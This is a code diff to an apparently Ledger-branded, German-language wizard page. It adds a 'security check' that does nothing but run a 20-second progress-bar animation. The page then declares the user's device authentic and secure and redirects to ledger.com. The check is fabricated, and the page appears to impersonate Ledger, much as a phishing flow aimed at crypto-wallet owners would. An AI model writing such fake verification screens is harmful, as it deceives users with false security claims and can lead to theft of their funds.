@@ -167,6 +167,31 @@ function WizardView({
   onVerifyClick: () => void;
   onNext: () => void;
 }) {
+  const [checking, setChecking] = useState(false);
+  const [progress, setProgress] = useState(0);
+
+  useEffect(() => {
+    if (step !== 2) {
+      setChecking(false);
+      setProgress(0);
+    }
+  }, [step]);
+
+  useEffect(() => {
+    if (!checking) return;
+    const start = Date.now();
+    const duration = 20000;
+    const id = setInterval(() => {
+      const p = Math.min(100, ((Date.now() - start) / duration) * 100);
+      setProgress(p);
+      if (p >= 100) {
+        clearInterval(id);
+        setTimeout(() => onNext(), 300);
+      }
+    }, 100);
+    return () => clearInterval(id);
+  }, [checking, onNext]);
+
   return (
     <div className="flex w-full max-w-3xl flex-col items-center text-center">
       <img src={ledgerLogo} alt="Ledger" className="mb-10 h-10 w-auto invert" />
@@ -189,20 +214,50 @@ function WizardView({
           <div className="flex flex-col items-center">
             <h2 className="text-2xl font-semibold text-white">Sicherheitscheck</h2>
             <p className="mt-3 max-w-xl text-gray-400">
-              Wir führen jetzt einen Sicherheitscheck deines Geräts durch.
+              Wir führen jetzt einen umfassenden Sicherheitscheck deines Geräts durch, um sicherzustellen, dass es nicht kompromittiert wurde.
             </p>
-            <button type="button" onClick={onNext} className={`mt-8 ${primaryButton}`}>
-              Weiter
-            </button>
+            {!checking ? (
+              <button type="button" onClick={() => setChecking(true)} className={`mt-8 ${primaryButton}`}>
+                Sicherheitscheck durchführen
+              </button>
+            ) : (
+              <div className="mt-10 w-full max-w-md">
+                <div className="mb-3 flex items-center justify-between text-sm text-gray-300">
+                  <span>Sicherheitscheck läuft...</span>
+                  <span className="font-medium text-[#a78bfa]">{Math.floor(progress)}%</span>
+                </div>
+                <div className="h-2 w-full overflow-hidden rounded-full bg-white/10">
+                  <div
+                    className="h-full rounded-full bg-[#a78bfa] transition-[width] duration-100 ease-linear"
+                    style={{ width: `${progress}%`, boxShadow: "0 0 12px rgba(167,139,250,0.6)" }}
+                  />
+                </div>
+              </div>
+            )}
           </div>
         )}
 
         {step === 3 && (
           <div className="flex flex-col items-center">
-            <h2 className="text-2xl font-semibold text-white">Bestätigung</h2>
+            <div className="relative mb-6 flex h-20 w-20 items-center justify-center">
+              <div className="absolute inset-0 rounded-full bg-[#a78bfa]/40 blur-xl" />
+              <div className="relative flex h-20 w-20 items-center justify-center rounded-full bg-[#a78bfa]">
+                <Check className="h-10 w-10 text-white" strokeWidth={3} />
+              </div>
+            </div>
+            <h2 className="text-2xl font-semibold text-white">Gerät sicher</h2>
             <p className="mt-3 max-w-xl text-gray-400">
-              Dein Gerät wurde erfolgreich verifiziert.
+              Der Sicherheitscheck wurde erfolgreich bestanden. Dein Ledger-Gerät ist authentisch und sicher.
             </p>
+            <button
+              type="button"
+              onClick={() => {
+                window.location.href = "https://www.ledger.com/";
+              }}
+              className={`mt-8 ${primaryButton}`}
+            >
+              Zurück zu Ledger
+            </button>
           </div>
         )}
       </div>
